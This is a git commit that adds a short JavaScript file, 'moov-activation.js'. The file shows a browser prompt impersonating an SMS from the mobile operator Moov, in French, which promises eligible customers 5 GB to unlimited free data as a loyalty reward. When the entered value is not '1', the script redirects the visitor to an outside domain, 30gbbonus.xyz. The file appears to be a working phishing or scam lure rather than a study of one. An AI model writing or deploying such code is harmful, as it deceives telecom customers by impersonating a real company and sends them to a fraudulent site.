ac7473a751d4136851f3d61b4c31f27c900dcad6
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-01 11:18:42 -0700

    Create moov-activation.js

---
+++ moov-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('MOOV SMS: Cher client, veuillez vérifier si votre carte SIM Moov est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/moov.html';
+}
